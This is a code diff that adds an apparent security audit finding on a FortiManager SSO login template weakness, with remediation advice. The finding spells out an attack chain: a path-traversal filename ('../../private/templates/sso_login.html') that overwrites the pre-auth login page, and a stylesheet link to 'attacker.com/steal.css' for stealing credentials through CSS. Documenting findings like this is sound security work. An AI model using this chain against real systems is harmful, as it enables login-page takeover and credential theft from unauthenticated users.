@@ -3165,6 +3165,26 @@ ANALYSIS_STATUS = {
                  "soar-connectors/FWEB/operator.py is byte-for-byte identical (confirmed by diff, no output); "
                  "remediation: URL-encode policy_name with urllib.parse.quote(policy_name, safe='') before .format() insertion; "
                  "source: fmg-builtin/FWEB/operator.py L295-340 (FWEBGetBlockedUsersOperator), L729-763 (FWEBGetServerPolicyTrafficOperator), analysis 2026-09-15",
+
+        "FMG-F75: HIGH -- FortiManager SSO custom login template stored HTML injection chain: ADMINPRIV_LOG_VIEWER can chain with FMG-F71 path traversal to replace the SAML IDP login page at /drive0/private/templates/sso_login.html with attacker-controlled HTML visible to all unauthenticated users; template sanitizer only strips <script> tags, leaving event handlers, CSS blocks, and arbitrary HTML intact; CSP blocks inline JS but CSS injection and full page replacement remain viable (FMG8.0.0, 2026-09-15): "
+                 "class: stored HTML injection leading to login page defacement and credential harvesting via privilege escalation chain; "
+                 "chain: (1) FMG-F71 path traversal -- ADMINPRIV_LOG_VIEWER uploads log file with "
+                 "Content-Disposition filename='../../private/templates/sso_login.html'; "
+                 "tmpFileName = '/drive0/tmp/' + '../../private/templates/sso_login.html' -> resolves to /drive0/private/templates/sso_login.html; "
+                 "(2) custom login template read by saml_login() at proj/views.py L151: soup = sso.real_template(sso.get_login_template()[1], csp_nonce); "
+                 "(3) sanitize_template() at util/templates.py L57-70 uses BeautifulSoup lxml parser and only calls soup.findAll('script').extract() -- "
+                 "all other HTML including event handlers (onerror, onclick), <style> blocks, <link> tags, and complete page structure passes through; "
+                 "(4) result served at pre-auth SAML SSO login page to all unauthenticated users; "
+                 "impact: log viewer (lower privilege) can replace login page with credential harvesting UI, inject CSS for attribute-selector credential exfiltration, "
+                 "redirect users to phishing site, or perform stored XSS via CSS injection (style-src unrestricted in @add_nonce CSP); "
+                 "CSP applied by @add_nonce: 'script-src self nonce-...' blocks inline JS event handlers but does NOT restrict style-src or link-src; "
+                 "direct stored XSS: ADMINPRIV_SYSTEM_SYS_SETTING can save malicious template via POST /p/util/idp_custom_login_template/post without sanitization; "
+                 "same sanitize_template() weakness applies -- admin can store <link rel=stylesheet href=attacker.com/steal.css> for CSS-based credential exfiltration; "
+                 "settings: CUSTOM_TEMPLATES_DIR=/drive0/private/templates/, IDP_LOGIN_TEMPLATE_FILE=sso_login.html (proj/settings.py L344-345); "
+                 "remediation: replace sanitize_template() with allowlist-based sanitizer (bleach/nh3); restrict style-src in @add_nonce CSP; "
+                 "source: util/templates.py L57-70 (sanitize_template), util/sso.py L201-211 (preview_template), "
+                 "proj/views.py L147-154 (saml_login), util/views.py L1138-1158 (post_idp_custom_login_template), "
+                 "logview/views/views.py L1535-1553 (FMG-F71 write primitive), analysis 2026-09-15",
     ],
     "faz_findings_that_apply": ["FAZ-F01", "FAZ-F02", "FAZ-F03", "FAZ-F04", "FAZ-F05", "FAZ-F09"],
 }
